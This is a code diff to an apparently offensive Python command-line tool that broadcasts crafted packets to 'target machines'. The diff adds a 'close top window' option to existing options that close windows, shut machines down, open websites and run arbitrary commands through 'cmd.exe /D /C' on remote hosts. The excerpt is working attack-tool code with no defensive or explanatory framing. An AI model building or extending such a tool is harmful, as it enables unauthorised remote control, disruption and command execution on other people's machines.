@@ -15,7 +15,15 @@ import binascii
 from typing import Any, Sequence, cast
 
 from sender import broadcast_packet
-from packet import pkg_close_windows, pkg_message, pkg_shutdown, pkg_rename, pkg_website, pkg_execute
+from packet import (
+    pkg_close_top_window,
+    pkg_close_windows,
+    pkg_message,
+    pkg_shutdown,
+    pkg_rename,
+    pkg_website,
+    pkg_execute,
+)
 
 
 class ModeOptionalAction(argparse.Action):
@@ -175,6 +183,12 @@ if __name__ == "__main__":
         help="Close all windows on the target machine",
     )
     attack_action.add_argument(
+        "-ctw",
+        "--close-top-window",
+        action="store_true",
+        help="Close the top window on the target machine",
+    )
+    attack_action.add_argument(
         "-n",
         "--rename",
         nargs=2,
@@ -201,6 +215,8 @@ if __name__ == "__main__":
             payload = pkg_website(args.website)
         elif args.command:
             payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
+        elif args.close_top_window:
+            payload = pkg_close_top_window()
         elif args.execute:
             match args.execute:
                 case [mode, [program]]:
